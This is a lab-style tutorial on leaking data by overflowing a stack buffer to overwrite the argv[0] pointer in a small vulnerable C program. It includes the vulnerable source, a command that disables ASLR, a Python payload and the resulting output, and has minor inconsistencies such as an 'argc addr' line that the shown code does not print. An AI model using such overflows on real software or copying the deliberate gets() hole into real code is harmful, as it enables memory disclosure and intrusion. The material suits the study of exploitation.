# Exploits
## Pointer in the stack corruption
## REQUIRED TO UNDERSTAND : Simple stack buffer overflow
## You should disable ASLR first : `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
In the stack, there is a lot more Interesting stuff that we could overwrite than the base pointer and the instruction pointer backups, when a program is loaded, there are many things that are loaded into it that it can use, such as program arguments, where the first one is the path + the name of the program, the environment variables... But those are pointers, thus they point to memory, but if we overwrite them with like `XXXX` the address where the pointer will point will be now `0x58585858`, and that's perfect, meaning that we can set this to any address that we want  
Here is an example where the program will print the program name, in we use it as `argv[0]` :
```c
#include <stdio.h>

const char* secret = "4m_1_sUpp0sed_t0_b3_a_fl4g_0r_4nyth1ng_?";

int main(int argc, char* argv[])
{
	char buffer[64];
	gets(buffer);
	printf("Program name : %s\n", argv[0]);
}
```
Compilation :
```
gcc <source code>.c -o <executable> -fno-stack-protector -m32
```
Here, the program will print the program name, but if we somehow corrupt the pointer `argv[0]` to make it point to for example the `secret` variable, it will print this variable, so it's an information leakage, but how can we corrupt it ?... 
Of course with a buffer overflow based on a buffer of 64 bytes (characters)  
So we first need to find the offset between the `buffer` and `argv[0]`  
It's a hassle to find the `argv` pointer address is gdb i will just print it :
```c
#include <stdio.h>

const char* secret = "4m_1_sUpp0sed_t0_b3_a_fl4g_0r_4nyth1ng_";

int main(int argc, char* argv[])
{
	char buffer[64];
	gets(buffer);
	printf("Program name : %s\n", argv[0]);

	printf("Buffer addr : %p\n", &buffer);
	printf("argv addr : %p\n", &argv);
}
```
That's what we need, notice i used `&` for each one because we don't want to know where is pointer pointing into but directly the address of the pointer  
This is what it gived me (may differ for you) :
```
./vuln
<(entry)>
Program name : ./vuln
Buffer addr : 0xffffd0e0
argv addr : 0xffffd154
```
We can see that the address of the `buffer` is `0xffffd0e0` and the address of `argv` is `0xffffd154`, so to get the offset between them, we, of couse, want to substract `argv` from `argv` : `0xffffd154`-`0xffffd0e0`, which gives `116` in this example  
So let's build the exploit :
```python
import struct
payload = "A"*(116) # offset between buffer and argv[0] (argv)
```
Then we just need the address content we want to print, such a coincidence, the goal is to get the `secret` variable content, so let's get it's address by using `nm` :
```
nm <executable> | grep secret
```
It gived me :
```
0804c020 D secret
```
Awesome : 
```python
import struct
payload = "A"*(116) # offset between buffer and argv[0] (argv)
payload += struct.pack("I", 0x0804c020)
print(payload)
```
Let's test this :
```
python exploit.py | ./<executable>
```
It gived me :
```
Program name : 4m_1_sUpp0sed_t0_b3_a_fl4g_0r_4nyth1ng_?
Buffer addr : 0xffffd0e0
argc addr : 0xffffd150
argv addr : 0xffffd154
zsh: done                python exploit.py | 
zsh: segmentation fault  ./vuln
```
Nice !  
You see, pointer corruption is really simple  
By the way in a libc function, there was a vulnerability like that where it prints this `argv`, guess where... In the stack smashing protection message, so yes, we could overwrite it just like that (the offset will differ) and then get information leakage  
In the new libc function, it's no longer possible but it was a vulnerability that existed  
Thanks for reading !
